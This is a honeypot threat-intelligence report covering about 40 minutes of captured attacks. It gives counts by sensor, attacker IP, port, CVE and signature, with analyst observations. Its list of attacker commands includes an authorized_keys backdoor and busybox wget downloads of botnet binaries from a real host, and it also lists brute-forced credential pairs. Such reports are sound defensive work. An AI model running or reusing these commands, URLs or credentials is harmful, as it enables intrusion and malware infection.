
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-11T04:01:30Z
**Timeframe of Analysis:** 2025-10-11T03:20:01Z to 2025-10-11T04:00:01Z
**Log Files Analyzed:**
- agg_log_20251011T032001Z.json
- agg_log_20251011T034001Z.json
- agg_log_20251011T040001Z.json

---

## Executive Summary

This report summarizes 21,507 events captured by the honeypot network over a period of approximately 40 minutes. The majority of attacks were registered on the Cowrie (SSH/Telnet), Dionaea (SMB/FTP), and Honeytrap honeypots. A significant portion of the activity originated from IP address `195.96.129.91`, primarily targeting Telnet ports 23 and 2323. Common attack vectors included brute-force login attempts, reconnaissance for system information, and attempts to download and execute malicious scripts. Several CVEs were observed, indicating attempts to exploit known vulnerabilities.

---

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 7,761
- **Honeytrap:** 5,186
- **Dionaea:** 3,929
- **Suricata:** 1,892
- **Ciscoasa:** 1,669
- **Mailoney:** 886
- **Sentrypeer:** 39
- **Tanner:** 22
- **ConPot:** 23
- **Honeyaml:** 24
- **Redishoneypot:** 24
- **H0neytr4p:** 30
- **Adbhoney:** 10
- **ElasticPot:** 6
- **Heralding:** 3
- **Ipphoney:** 1
- **ssh-rsa:** 2

### Top Attacking IPs
- **195.96.129.91:** 4,974
- **49.48.125.123:** 2,831
- **143.44.164.80:** 991
- **176.65.141.117:** 820
- **165.227.174.138:** 793
- **161.132.48.14:** 629
- **45.81.23.80:** 362
- **4.213.160.153:** 355
- **185.121.0.25:** 352
- **88.210.63.16:** 417
- **167.250.224.25:** 426
- **45.128.199.212:** 217
- **4.4.171.222:** 224
- **103.145.145.80:** 188
- **212.233.136.201:** 149
- **34.122.106.61:** 138
- **103.23.199.87:** 115
- **68.183.193.0:** 97
- **211.201.163.70:** 88
- **157.230.242.104:** 60

### Top Targeted Ports/Protocols
- **445:** 3,827
- **2323:** 1,970
- **23:** 1,533
- **22:** 800
- **25:** 886
- **5038:** 265
- **5903:** 182
- **8333:** 74
- **5908:** 80
- **5909:** 79
- **5901:** 73
- **TCP/22:** 49
- **5907:** 47
- **5060:** 30
- **TCP/443:** 11
- **135:** 13
- **80:** 19

### Most Common CVEs
- **CVE-2002-0013 CVE-2002-0012:** 5
- **CVE-2002-0013 CVE-2002-0012 CVE-1999-0517:** 4
- **CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255:** 2
- **CVE-2016-20016 CVE-2016-20016:** 1
- **CVE-2005-4050:** 1
- **CVE-2022-27255 CVE-2022-27255:** 1

### Commands Attempted by Attackers
- `uname -a`, `uname -m`, `uname`
- `whoami`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem ...`
- `crontab -l`
- `w`
- `top`
- `df -h ...`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `cd /data/local/tmp/; busybox wget ...; sh w.sh`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass ...`
- `tftp; wget; /bin/busybox PVDFW`
- `shell`, `sh`, `busybox`, `help`

### Signatures Triggered
- **ET DROP Dshield Block Listed Source group 1:** 488
- **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 350
- **ET HUNTING RDP Authentication Bypass Attempt:** 154
- **ET SCAN NMAP -sS window 1024:** 143
- **ET SCAN Potential SSH Scan:** 41
- **ET INFO Reserved Internal IP Traffic:** 55
- **ET CINS Active Threat Intelligence Poor Reputation IP group 44:** 23
- **GPL TELNET Bad Login:** 9
- **ET INFO CURL User Agent:** 8
- **ET DROP Spamhaus DROP Listed Traffic Inbound group 32:** 12

### Users / Login Attempts
- **root/Ahgf3487@rtjhskl854hd47893@#a4nC:** 12
- **345gs5662d34/345gs5662d34:** 13
- **root/nPSpP4PBW0:** 8
- **odroid/odroid:** 6
- **root/123.321:** 6
- **root/1qaz@WSX3edc:** 6
- **github/P@ssw0rd:** 6
- **admin/ubuntu:** 4
- **support/111:** 4
- **root/LeitboGi0ro:** 4

### Files Uploaded/Downloaded
- `arm.urbotnetisass`
- `arm5.urbotnetisass`
- `arm6.urbotnetisass`
- `arm7.urbotnetisass`
- `x86_32.urbotnetisass`
- `mips.urbotnetisass`
- `mipsel.urbotnetisass`
- `w.sh`
- `c.sh`
- `?format=json`
- `fonts.gstatic.com`
- `ie8.css?ver=1.0`
- `html5.js?ver=3.7.3`

### HTTP User-Agents
- No specific user agents were logged in the provided data.

### SSH Clients and Servers
- No specific SSH client or server versions were logged in the provided data.

### Top Attacker AS Organizations
- No specific AS organizations were logged in the provided data.

---

## Key Observations and Anomalies

1.  **High-Volume Telnet Scans:** The IP `195.96.129.91` was responsible for a large volume of traffic targeting Telnet ports 23 and 2323, indicating a widespread, automated scanning or brute-force campaign.
2.  **SSH Key Manipulation:** Multiple attackers attempted to modify the `.ssh/authorized_keys` file. This is a common technique to establish persistent access to a compromised machine.
3.  **Malware Download Commands:** Several commands were observed attempting to download and execute shell scripts (`w.sh`, `c.sh`) and binary files (`*.urbotnetisass`). This is indicative of attempts to deploy botnet clients or other malware onto the honeypot.
4.  **System Reconnaissance:** Attackers frequently ran commands like `uname`, `lscpu`, and `free -m` to gather information about the system's architecture and resources, likely to tailor subsequent attacks or malware payloads.
5.  **Targeting of SMB:** Port 445 (SMB) received the highest number of connection attempts, suggesting widespread scanning for vulnerabilities like EternalBlue or simply open file shares.
